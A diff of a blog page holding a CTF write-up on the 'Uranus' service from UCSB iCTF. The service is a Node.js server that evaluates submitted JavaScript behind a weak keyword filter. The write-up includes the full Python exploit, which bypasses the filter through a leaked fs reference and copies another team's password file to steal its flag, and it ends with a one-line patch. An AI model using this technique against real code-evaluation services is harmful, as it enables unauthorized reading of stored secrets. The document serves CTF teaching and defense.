+                <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
+                <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Your password: &#39;</span> <span class="o">+</span> <span class="nx">old_password</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">);</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nx">password</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+                <span class="nx">code</span> <span class="o">=</span> <span class="nx">data_json</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nx">checkCode</span><span class="p">(</span><span class="nx">code</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="k">try</span> <span class="p">{</span>
+                        <span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
+                    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
+                        <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Your code has runtime errors: &#39;</span> <span class="o">+</span> <span class="nx">E</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">);</span>
+                    <span class="p">}</span>
+                    <span class="k">try</span> <span class="p">{</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="nx">password</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+                            <span class="nx">storeSubmission</span><span class="p">(</span><span class="nx">data_json</span><span class="p">[</span><span class="s1">&#39;flag_id&#39;</span><span class="p">],</span> <span class="nx">data_json</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">],</span> <span class="nx">code</span><span class="p">);</span>
+                            <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
+                            <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Code approved. Please check your parameters carefully before deploying the code to the nuclear reactor.\n&#39;</span><span class="p">);</span>
+                        <span class="p">}</span>
+                    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">E</span><span class="p">);</span>
+                    <span class="p">}</span>
+                    <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
+                    <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Your code is missing an access code to the nuclear reactor. Expected variable according to the documentation is &quot;password&quot;.\n&#39;</span><span class="p">);</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Code contains unsafe functionality.\n&#39;</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
+            <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Your JSON is malformed. Please provide the following properties: flag_id, token, code\n&#39;</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">});</span>
+<span class="p">}</span>
 
-<p>process.on(‘uncaughtException’, function (E) {
-    console.log(‘Caught exception: ‘ + E);
-});</p>
+<span class="nx">process</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;uncaughtException&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Caught exception: &#39;</span> <span class="o">+</span> <span class="nx">E</span><span class="p">);</span>
+<span class="p">});</span>
 
-<p>http.createServer(function handle(req, res) {
-    if (req.method.indexOf(‘POST’) != -1) {
-        handlePOST(req, res);
-    } else {
-        res.writeHead(200, { ‘Content-Type’: ‘text/plain’ });
-        res.end(‘Welcome to Uranus!\nWith the last update of our nuclear reactor we can now control critical variables of the process through the easyness of JavaScript. Uranus is here to proof-check your code for safety before you submit it directly to the reactor. \n\nUse HTTP POST to submit your code.’);
-    }
-}).listen(1337, ‘0.0.0.0’);</p>
+<span class="nx">http</span><span class="p">.</span><span class="nx">createServer</span><span class="p">(</span><span class="kd">function</span> <span class="nx">handle</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">method</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;POST&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">handlePOST</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
+        <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Welcome to Uranus!\nWith the last update of our nuclear reactor we can now control critical variables of the process through the easyness of JavaScript. Uranus is here to proof-check your code for safety before you submit it directly to the reactor. \n\nUse HTTP POST to submit your code.&#39;</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}).</span><span class="nx">listen</span><span class="p">(</span><span class="mi">1337</span><span class="p">,</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">);</span>
 
-<p>console.log(‘Server running at http://0.0.0.0:1337/’);
-```</p>
-
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Server running at http://0.0.0.0:1337/&#39;</span><span class="p">);</span>
+</code></pre></div>
 <p>The full functionality:</p>
 
 <ul>
-  <li>If <code>flag_id</code>, <code>token</code> and <code>code</code> is specified as JSON
-    <ul>
-      <li>the code is run if it passes the filter (<code>eval</code>, <code>global</code>, <code>Function</code> and <code>this</code> is not alowed)</li>
-      <li>the code can’t use <code>require</code> because <a href="https://groups.google.com/forum/#!topic/nodejs/vFkaH8gouDU">it’s not exposed by default</a> when using the <code>vm</code> module</li>
-      <li>if it sets the variable <code>password</code> then the code is stored in this file: <code>submissions/{flag_id}-{token}</code></li>
-    </ul>
-  </li>
-  <li>If only <code>flag_id</code> and <code>token</code> is specified
-    <ul>
-      <li>the password from the <code>submissions/{flag_id}-{token}</code> file is read and returned</li>
-      <li>but only if the password is 16 alphanumerical character</li>
-    </ul>
-  </li>
+<li>If <code>flag_id</code>, <code>token</code> and <code>code</code> is specified as JSON
+
+<ul>
+<li>the code is run if it passes the filter (<code>eval</code>, <code>global</code>, <code>Function</code> and <code>this</code> is not alowed)</li>
+<li>the code can&#39;t use <code>require</code> because <a href="https://groups.google.com/forum/#!topic/nodejs/vFkaH8gouDU">it&#39;s not exposed by default</a> when using the <code>vm</code> module</li>
+<li>if it sets the variable <code>password</code> then the code is stored in this file: <code>submissions/{flag_id}-{token}</code></li>
+</ul></li>
+<li>If only <code>flag_id</code> and <code>token</code> is specified
+
+<ul>
+<li>the password from the <code>submissions/{flag_id}-{token}</code> file is read and returned</li>
+<li>but only if the password is 16 alphanumerical character</li>
+</ul></li>
 </ul>
 
-<h2 id="exploitation">Exploitation</h2>
+<h2>Exploitation</h2>
 
 <p>Our exploit worked like this:</p>
 
 <ol>
-  <li>Upload a code,</li>
-  <li>that finds the file associated with the flag_id</li>
-  <li>and copies the file to a known location.</li>
-  <li>Use the password retrieval functionality to retrieve the password from the known location.</li>
+<li>Upload a code,</li>
+<li>that finds the file associated with the flag_id</li>
+<li>and copies the file to a known location.</li>
+<li>Use the password retrieval functionality to retrieve the password from the known location.</li>
 </ol>
 
-<p>Here’s the full exploit code:</p>
+<p>Here&#39;s the full exploit code:</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">urllib2</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">re</span>
 
-<p>```python
-import urllib2
-import json
-import re</p>
 
-<p>class Exploit():
-    code = “””
-    fname = ff.readdirSync(‘./submissions’).filter(function(name) { return name.match(/^%s-.*/) })[0];
-    ff.writeFileSync(‘./submissions/spamandhex-1’, ff.readFileSync(‘./submissions/’ + fname));
-    “””</p>
+<span class="k">class</span> <span class="nc">Exploit</span><span class="p">():</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="s">&quot;&quot;&quot;</span>
+<span class="s">    fname = ff.readdirSync(&#39;./submissions&#39;).filter(function(name) { return name.match(/^</span><span class="si">%s</span><span class="s">-.*/) })[0];</span>
+<span class="s">    ff.writeFileSync(&#39;./submissions/spamandhex-1&#39;, ff.readFileSync(&#39;./submissions/&#39; + fname));</span>
+<span class="s">    &quot;&quot;&quot;</span>
 
-<pre><code>def get(self, url, flag_id, token):
-    data = json.dumps({ "flag_id": flag_id, "token": token })
-    return urllib2.urlopen(url=url, data=data).read()
+    <span class="k">def</span> <span class="nf">get</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">flag_id</span><span class="p">,</span> <span class="n">token</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span> <span class="s">&quot;flag_id&quot;</span><span class="p">:</span> <span class="n">flag_id</span><span class="p">,</span> <span class="s">&quot;token&quot;</span><span class="p">:</span> <span class="n">token</span> <span class="p">})</span>
+        <span class="k">return</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
 
-def set(self, url, flag_id, token, code):
-    data = json.dumps({ "flag_id": flag_id, "token": token, "code": code })
-    return urllib2.urlopen(url=url, data=data).read()
+    <span class="k">def</span> <span class="nf">set</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">flag_id</span><span class="p">,</span> <span class="n">token</span><span class="p">,</span> <span class="n">code</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span> <span class="s">&quot;flag_id&quot;</span><span class="p">:</span> <span class="n">flag_id</span><span class="p">,</span> <span class="s">&quot;token&quot;</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span> <span class="s">&quot;code&quot;</span><span class="p">:</span> <span class="n">code</span> <span class="p">})</span>
+        <span class="k">return</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
 
-def execute(self, ip, port, flag_id):
-    url = 'http://%s:%s' % (ip, port)
-    self.set(url, '1234', '1', Exploit.code % flag_id)
-    result = self.get(url, 'spamandhex', '1')
-    self.flag = re.findall('Your password: (.*)', result)[0]
+    <span class="k">def</span> <span class="nf">execute</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">flag_id</span><span class="p">):</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="s">&#39;http://</span><span class="si">%s</span><span class="s">:</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">&#39;1234&#39;</span><span class="p">,</span> <span class="s">&#39;1&#39;</span><span class="p">,</span> <span class="n">Exploit</span><span class="o">.</span><span class="n">code</span> <span class="o">%</span> <span class="n">flag_id</span><span class="p">)</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="s">&#39;spamandhex&#39;</span><span class="p">,</span> <span class="s">&#39;1&#39;</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">flag</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">&#39;Your password: (.*)&#39;</span><span class="p">,</span> <span class="n">result</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
 
-def result(self):
-    return {'FLAG' : self.flag} ```
-</code></pre>
-
+    <span class="k">def</span> <span class="nf">result</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">{</span><span class="s">&#39;FLAG&#39;</span> <span class="p">:</span> <span class="bp">self</span><span class="o">.</span><span class="n">flag</span><span class="p">}</span>
+</code></pre></div>
 <p>Instead of using <code>require</code> to access the <code>fs</code> module, the global <code>ff</code> variable (set by the server code) was used that holds a reference to the <code>fs</code> module. The filter does not find the <code>function</code> keyword because the filter was <code>/Function/</code> and regexes are case-sensitive by default.</p>
 
 <p>After launching our own, we also saw an exploit that abuses the fact that exceptions were reported back to the submitter. This exploit did read out the password from the appropriate file and generated an exception with the password as text.</p>
 
-<h2 id="patch">Patch</h2>
+<h2>Patch</h2>
 
 <p>As a patch, I renamed the <code>ff</code> variable to <code>fs</code>, and it turned out to be enough to keep the other teams away.</p>
 
-<h2 id="thanks">Thanks</h2>
+<h2>Thanks</h2>
 
 <p>It was great fun to solve this puzzle, just as fun as the whole UCSB iCTF competition this year. Thanks to the organizers for organizing such a great competition again this year!</p>
 
 
-
-                <hr>
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = 'gabor-molnar';
+    
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
 
                 <ul class="pager">
                     
